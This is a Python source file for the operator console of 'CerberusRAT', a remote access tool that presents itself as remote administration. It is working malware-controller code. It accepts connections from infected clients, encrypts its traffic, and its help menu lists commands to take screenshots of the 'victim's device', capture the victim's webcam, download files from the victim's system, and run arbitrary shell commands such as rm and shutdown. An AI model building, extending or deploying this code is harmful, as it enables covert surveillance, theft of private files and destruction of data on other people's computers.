import socket
import cv2
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
import datetime
import time
from tqdm import tqdm
import pyfiglet
import os
import sys
# Uncomment next line to enable interactive input editing and history substitution. May be buggy.
#import readline

PACKAGE_SIZE = 9999
HOST_ADDRESS = '0.0.0.0'
if sys.platform == 'win32':
    os.system('cls')
else:
    os.system('clear')
banner = '\033[92m' + pyfiglet.figlet_format('CerberusRAT', font='mono9')
print(banner.center(os.get_terminal_size().columns))
print('\033[1mAn open source cross-platform remote administration tool.\033[0m'.center(os.get_terminal_size().columns))

HOST_PORT = int(input('Listen port: '))


def save_file(data, filename):
    file = open(filename, 'wb')
    file.write(data)
    file.close()
    print('Saved file as', filename)


def parse_args(line):
    args = list(line.split())
    args.pop(0)
    return args


def receive_data(connection, fernet):
    size = int(fernet.decrypt(connection.recv(1024)).decode())
    iterations = size // PACKAGE_SIZE
    if size % PACKAGE_SIZE != 0:
        iterations += 1
    data = b''
    if size >= PACKAGE_SIZE + 1:
        for i in tqdm(range(iterations)):
            new_data = connection.recv(PACKAGE_SIZE * 2)
            data += fernet.decrypt(new_data)
            connection.send(b'1')
    else:
        for i in range(iterations):
            new_data = connection.recv(PACKAGE_SIZE * 2)
            data += fernet.decrypt(new_data)
            connection.send(b'1')

    return data


class Command():

    def __init__(self, text, fernet, connection):
        self.plaintext = text
        self.fernet = fernet
        self.cmd = self.fernet.encrypt(self.plaintext.encode())
        self.connection = connection

    def execute(self):
        self.connection.send(self.cmd)
        data = receive_data(self.connection, self.fernet)
        if self.plaintext == 'screenshot' or self.plaintext == 'webcam':
            path = input('Path to save the file: ')
            save_file(data, path)
        elif self.plaintext[:3] == 'get':
            path = input('Path to save the file: ')
            save_file(data, path)
        else:
            if data.decode().endswith('\n'):
                print(data.decode(), end='')
            else:
                print(data.decode())


def control_client():
    client, ip = host.accept()
    print('\033[33mClient connected. Exchanging encryption keys...\033[22m')
    rsa_public_key = serialization.load_pem_public_key(client.recv(1024))
    client.send(rsa_public_key.encrypt(fernet_key, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)))
    print('\033[5;92mReady!\033[25m')
    while True:
        cmd_plaintext = input(f'\033[96;1mclient@{ip[0]}:\033[0m ')
        if cmd_plaintext != 'help':
            cmd = Command(cmd_plaintext, fernet, client)
            cmd.execute()
        else:
            print(f"""\033[1;92m
|*****************************************************************|
| List of commands for CerberusRAT:                               |
|                                                                 |
| screenshot - do a screenshot on victim's device and download it |
| help - get list of commands                                     |
| webcam - capture victim's camera and download the photo         |
| platform - get victim's OS platform                             |
| get <path> - download a file from victim's system               |
|                                                                 |
| You can also use all built-in commands in victim's OS!          |
| Example: dir, ls, echo, mkdir, rmdir, shutdown, rm, msg, copy   |
|                                                                 |
|*****************************************************************|\033[0m
""")


host = socket.socket()
host.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
host.bind((HOST_ADDRESS, HOST_PORT))
host.listen(5)
fernet_key = Fernet.generate_key()
fernet = Fernet(fernet_key)
while True:
    try:
        print('\033[94mWaiting for client...\033[22m')
        control_client()
    except Exception as exception:
        if str(exception) != '':
            print('\033[91m' + str(exception) + '\033[22m')
        print('\033[91mError occured or client disconnected!\033[22m')
        time.sleep(5)
